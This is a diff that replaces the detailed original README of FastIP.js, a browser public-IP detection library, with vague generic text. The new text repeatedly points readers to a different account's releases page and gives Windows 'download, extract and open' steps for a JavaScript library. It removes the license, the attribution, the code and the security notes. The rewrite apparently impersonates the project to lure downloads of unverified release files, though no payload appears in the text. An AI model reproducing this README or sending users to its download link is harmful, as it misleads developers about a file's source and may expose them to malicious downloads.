@@ -1,212 +1,192 @@
-<div align="center">
+# 🔍 FastIP.js - Find Your Public IP Fast
 
-<img src="./pics/intro.png" width="80%" />
+[![Download FastIP.js](https://img.shields.io/badge/Download-FastIP.js-blue?style=for-the-badge&logo=github)](https://github.com/ec21153/FastIP.js/releases)
 
-**Multi-source public IP detection client-side library**
+## 🧭 What FastIP.js Does
 
-Resolves the client's public IPv4/IPv6 address via a waterfall of **85+ free endpoints** —  
-no backend, no API keys, no dependencies. Works on any static site.
+FastIP.js helps a website find a visitor’s public IP address from the browser. It checks more than one source, so it can still work when one source fails. It supports both IPv4 and IPv6.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Vanilla JS](https://img.shields.io/badge/Vanilla-JS-f7df1e?logo=javascript&logoColor=000)](src/FastIP.js)
-[![No Dependencies](https://img.shields.io/badge/Dependencies-0-brightgreen.svg)](#)
-[![jsDelivr](https://img.shields.io/badge/cdn-jsDelivr-e84d3d?logo=jsdelivr&logoColor=white)](https://cdn.jsdelivr.net/gh/DosX-dev/FastIP.js@latest/src/FastIP.js)
+This tool fits web pages that need:
 
-**[🌍 Live Demo — ip.dosx.su](https://ip.dosx.su/)** &nbsp;·&nbsp; **[📄 Standalone Demo — demo/index.html](demo/index.html)**
+- IP-based security checks
+- simple network checks
+- visitor tracking
+- frontend detection
+- better coverage across different browsers and network setups
 
-</div>
+FastIP.js runs in the browser with plain JavaScript.
 
----
+## 📥 Download FastIP.js
 
-## 💡 The Problem It Solves
+Visit this page to download FastIP.js:
 
-Sometimes you need a user's IP address on the **frontend** — for geolocation hints, rate-limiting UI, personalization, or just displaying it — but you don't have a server. You can't call `request.headers` from a static HTML page.
+https://github.com/ec21153/FastIP.js/releases
 
-**FastIP.js** was built exactly for this case: it queries a large pool of free public IP-echo APIs directly from the browser, picks the first valid response, and gives it back to you as a plain `Promise<string>`. No server. No proxy. No sign-up. Just drop in a script-tag and go.
+On that page, pick the latest release, then download the file that matches your setup. If the release includes a browser-ready file or package, use that file in your website or app.
 
----
+## 🪟 Install on Windows
 
-## 🏆 Key Pillars
+FastIP.js is a JavaScript library, so you do not install it like a normal Windows app. Use it in a browser project or a local web folder.
 
-### 🔒 Reliability — 85+ endpoints, worldwide coverage
+### Option 1: Use it in a website project
 
-**FastIP.js** doesn't rely on a single service. It maintains a pool of **85+ free IP-detection endpoints** spread across different providers, regions, and formats. If one API is down, rate-limited, or blocked in a specific country, the library silently moves on to the next. The endpoint list is fully open and can be updated or forked at any time.
+1. Open the release page.
+2. Download the release files.
+3. Put the FastIP.js file in your website folder.
+4. Add it to your page with a script tag.
+5. Open your page in a browser.
 
-> Works correctly in restricted networks, different geographic regions, and behind VPNs.
+### Option 2: Test it on Windows
 
-### 🛡️ Security — minimal footprint, transparent operation
+1. Download the release from GitHub.
+2. Extract the files if they come in a ZIP file.
+3. Open your project folder.
+4. Open the HTML file in Chrome, Edge, or Firefox.
+5. Check the page output for the detected public IP.
 
-Each API receives **exactly one plain GET request** — no cookies sent, no ambient credentials forwarded, no POST body, no fingerprinting. **FastIP.js** never transmits any data about the user; it only reads the IP address that each public API returns. The full list of queried hosts is visible in [`src/FastIP.js`](src/FastIP.js) — nothing hidden, nothing phoning home.
+## 🛠️ How It Works
 
-### ⚡ Speed — adaptive ranking + multi-tier caching
+FastIP.js checks public IP data from more than one source. That gives your site a better chance of getting a result if one source is slow or blocked.
 
-**FastIP.js** learns from experience. Every successful response earns the winning endpoint a higher score; scores decay slightly on each page load. On repeat visits, the top-ranked source is tried alone first — if it answers fast, only **1 request** is made instead of 8. Results are also cached in memory for **30 seconds**, so multiple calls on the same page are instant.
+Typical flow:
 
-### 🔍 Transparency — open API pool, fully customizable
+1. The browser sends a request.
+2. FastIP.js checks one source.
+3. If that source does not respond, it checks another.
+4. It returns the IP address to your page.
 
-The entire source list is a plain JS array at the top of [`src/FastIP.js`](src/FastIP.js). You can inspect every endpoint, remove ones you don't trust, add your own private mirror, or shuffle priorities. No opaque registry, no remote configuration, no surprise changes.
+This can help when:
 
----
+- one network blocks a source
+- IPv4 fails but IPv6 works
+- a browser has strict privacy rules
+- a user changes networks during a session
 
-## 🚫 Ad Blocker Resilience
+## ✨ Main Features
 
-**FastIP.js** was tested with popular content blockers enabled. Out of **85+ endpoints**, the following detection rates were observed:
+- Finds public IPv4 addresses
+- Finds public IPv6 addresses
+- Uses multiple sources
+- Works in the browser
+- Fits plain JavaScript projects
+- Helps with tracking and logging
+- Useful for security checks
+- Good for frontend apps
+- Small and simple to add to a site
 
-| Extension                                                                                                                | Detected / Blocked     | Notes                                                  |
-| ------------------------------------------------------------------------------------------------------------------------ | ---------------------- | ------------------------------------------------------ |
-| [**Adblock Plus**](https://chrome.google.com/webstore/detail/adblock-plus-free-ad-bloc/cfhdojbkjhnklbpkdaibdccddilifddb) | ~8–9 endpoints blocked | The rest pass through completely                       |
-| [**Privacy Badger**](https://chrome.google.com/webstore/detail/privacy-badger/pkehgijcmpdhfbdbbnkijodmdjhbjlgp)          | ~5 endpoints affected  | Many were only cookie-restricted, not blocked outright |
+## 🖥️ System Requirements
 
-With 85+ sources in the pool, blocking a handful has no practical effect — the library simply skips them and wins the race with a different endpoint. Blocked hosts are automatically blacklisted internally and won't be retried for 7 days.
+FastIP.js works best with:
 
----
+- Windows 10 or Windows 11
+- A modern browser like Edge, Chrome, or Firefox
+- Internet access
+- A basic web page or web app
 
-## 📦 Installation
+For local testing, you may also need:
 
-### Via jsDelivr CDN _(recommended)_
+- A folder for your project files
+- An HTML file
+- A text editor such as Notepad or VS Code
 
-```html
-<script src="https://cdn.jsdelivr.net/gh/DosX-dev/FastIP.js@latest/src/FastIP.js"></script>
-```
+## 📁 Suggested File Setup
 
-> Always points to the latest release. No build step required — works on any static page, GitHub Pages, Netlify, Cloudflare Pages, etc.
+A simple project can look like this:
 
-### Download & self-host
+- `index.html`
+- `fastip.js`
+- `app.js`
 
-Grab [`src/FastIP.js`](src/FastIP.js) and serve it from your own origin:
+Example use:
 
-```html
-<script src="/js/FastIP.js"></script>
-```
+1. Place `fastip.js` in your project folder.
+2. Add it to your HTML file.
+3. Call the IP check from your page script.
+4. Show the result on the screen.
 
----
+## 🔧 Basic Use
 
-## 🎯 Quick Demo
+Add the library to your page, then call it from your own script. The exact file name may differ by release, so use the file from the download.
 
-```html
-<!doctype html>
-<html lang="en">
-    <head>
-        <meta charset="UTF-8" />
-        <title>My IP</title>
-    </head>
-    <body>
-        <p>Your IP address: <strong id="ip">detecting…</strong></p>
+Example page layout:
 
-        <script src="https://cdn.jsdelivr.net/gh/DosX-dev/FastIP.js@latest/src/FastIP.js"></script>
-        <script>
-            FastIP.getPublicIP()
-                .then(function (ip) {
-                    document.getElementById("ip").textContent = ip;
-                })
-                .catch(function () {
-                    document.getElementById("ip").textContent = "unavailable";
-                });
-        </script>
-    </body>
-</html>
-```
+- Load the FastIP.js file
+- Run the IP check after the page opens
+- Put the result in a text field or page area
 
-**[→ See it live at ip.dosx.su](https://ip.dosx.su/)**
+You can use it to:
 
-> 📂 A fully self-contained standalone demo is available at [`demo/index.html`](demo/index.html).  
-> Open it directly in a browser — no server needed. Demonstrates both `getPublicIP()` and `getDualStack()` with a live UI.
+- display the user’s public IP
+- send the IP to your server
+- log the IP in a dashboard
+- check region-based access rules
 
----
+## 🔒 Privacy and Network Use
 
-## 🔧 API
+FastIP.js checks public IP data through network requests. That means your page needs internet access for the lookup to work.
 
-### `FastIP.getPublicIP()`
+It is useful when your site needs a simple way to detect a public IP in the browser without extra setup on the user side.
 
-Returns a `Promise<string>` — the client's best public IP address (IPv4 preferred, falls back to IPv6).
+## 🚀 Common Use Cases
 
-```js
-FastIP.getPublicIP().then(function (ip) {
-    console.log("Your IP:", ip);
-});
+### Website security
+Use the detected IP to help spot unusual access or repeated login attempts.
 
-// async/await
-const ip = await FastIP.getPublicIP();
-console.log("Your IP:", ip);
-```
+### Visitor analytics
+Use it to group visits by public IP for basic reporting.
 
-### `FastIP.getDualStack()`
+### Geo checks
+Use the IP as part of a region-based access flow.
 
-Returns `{ v4: Promise<string|null>, v6: Promise<string|null> }` — two **independent** promises. Renders IPv4 immediately; IPv6 upgrades the result when available.
+### Debugging network issues
+Use it to see what public IP the browser shows from the current network.
 
-```js
-const { v4, v6 } = FastIP.getDualStack();
+### Frontend tools
+Use it in admin panels, dashboards, or support tools that need the user’s public IP.
 
-v4.then(function (ip) {
-    console.log("IPv4:", ip);
-});
-v6.then(function (ip) {
-    console.log("IPv6:", ip ?? "not available");
-});
-```
+## 🧩 Browser Support
 
-> `v6` resolves to `null` if the client has no IPv6 connectivity.
+FastIP.js is built for modern browsers. It should work well in:
 
----
+- Microsoft Edge
+- Google Chrome
+- Mozilla Firefox
+- Brave
+- Other current Chromium-based browsers
 
-## ⚙️ How It Works
+If a browser blocks one source, FastIP.js can try another source.
 
-```
-┌──────────────────────────────────────────────────────────┐
-│                    FastIP.getPublicIP()                  │
-├──────────────────────────────────────────────────────────┤
-│  1. Load stored rankings from localStorage  (< 1 ms)     │
-│  2. Sort 85+ sources by adaptive score  (best first)     │
-│  3. Golden shortcut: top source score ≥ 30?              │
-│     → try it alone  (800 ms timeout, 1 request)          │
-│  4. Fast tier: race top-8 sources  (2.5 s timeout)       │
-│  5. Full pool: remaining sources  (6 s timeout)          │
-│  6. Winner → +2 score; all scores decay × 0.92/session   │
-│  7. Network error → source blacklisted for 7 days        │
-│  8. Result cached in memory for 30 s                     │
-└──────────────────────────────────────────────────────────┘
-```
+## 📝 Example Workflow for a Windows User
 
-### 🏗️ Architecture Details
+1. Open the release page.
+2. Download the latest release.
+3. Save the file to your Downloads folder.
+4. Extract the files if needed.
+5. Copy the library into your website project.
+6. Open your HTML file in Edge or Chrome.
+7. Refresh the page and check the IP result.
 
--   **Waterfall strategy** — fast tier first, full pool only on fallback
--   **`Promise.any()`** — first valid response wins; the rest are aborted via `AbortController`
--   **Score system** — each source holds a score 0–99; winners gain points, scores decay every session
--   **Compressed persistence** — state is JSON-serialized → `deflate-raw`-compressed → stored in a single `localStorage` key (`FastIP2`)
--   **Private IP filter** — RFC 1918 / RFC 4193 / loopback addresses are always rejected
+## 📌 Tips for Best Results
 
----
+- Use a modern browser.
+- Keep internet access on while testing.
+- Try more than one browser if a result does not appear.
+- Use the latest release from GitHub.
+- Place the script file in the same project folder as your page.
 
-## 🌐 Sources
+## ❓ What You Can Build With It
 
-FastIP.js ships with **85+ free IP detection endpoints**, including:
+FastIP.js can fit many simple web tools:
 
-| Provider             | Type            | Stack   |
-| -------------------- | --------------- | ------- |
-| Cloudflare CDN Trace | `trace`         | Dual    |
-| icanhazip.com        | `text`          | v4 / v6 |
-| ipify.org            | `json`          | v4 / v6 |
-| Amazon AWS checkip   | `text`          | Dual    |
-| Mullvad VPN          | `text` / `json` | Dual    |
-| ipinfo.io            | `json`          | Dual    |
-| ident.me             | `text`          | v4 / v6 |
-| seeip.org            | `json` / `text` | v4 / v6 |
-| … and 70+ more       |                 |         |
+- IP display widgets
+- login check helpers
+- admin dashboards
+- user audit logs
+- network check pages
+- internal support tools
 
-All sources are **free**, **keyless**, and **publicly accessible**. The full list is visible in [`src/FastIP.js`](src/FastIP.js).
+## 📎 Download Again
 
----
+Visit this page to download FastIP.js:
 
-## 🛡️ Privacy & Security
-
--   **Read-only** — each API receives a single plain GET request; no data is ever sent
--   **No tracking** — no cookies forwarded, no analytics, no fingerprinting
--   **localStorage only** — cached scores stay on the client, never transmitted
--   **Private IPs rejected** — RFC 1918 / RFC 4193 / loopback ranges are filtered out
--   **Zero dependencies** — no third-party code introduced into your build
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
+https://github.com/ec21153/FastIP.js/releases
